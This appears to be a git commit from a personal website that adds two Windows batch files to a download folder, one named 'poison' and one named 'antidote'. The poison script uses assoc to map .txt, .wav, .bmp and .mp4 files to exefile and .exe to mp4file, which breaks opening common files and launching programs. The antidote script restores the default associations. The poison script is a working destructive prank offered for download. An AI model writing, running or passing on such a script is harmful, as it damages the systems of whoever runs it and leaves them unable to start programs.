536fa02329b3d6b02e70a0bf2212cdfaa7ae56bc
Xiaoyangy <949666125@qq.com>
2020-05-02 23:13:18 +0800

    Site updated: 2020-05-02 23:12:49

---
+++ download/毒药.bat
@@ -0,0 +1,13 @@
+@echo off
+pause
+pause
+pause
+assoc .txt=exefile
+
+assoc .wav=exefile
+
+assoc .bmp=exefile
+
+assoc .mp4=exefile
+
+assoc .exe=mp4file
---
+++ download/解药.bat
@@ -0,0 +1,11 @@
+@echo off
+
+assoc .txt=txtfile
+
+assoc .wav=wavfile
+
+assoc .bmp=bmpfile
+
+assoc .mp4=mp4file
+
+assoc .exe=exefile
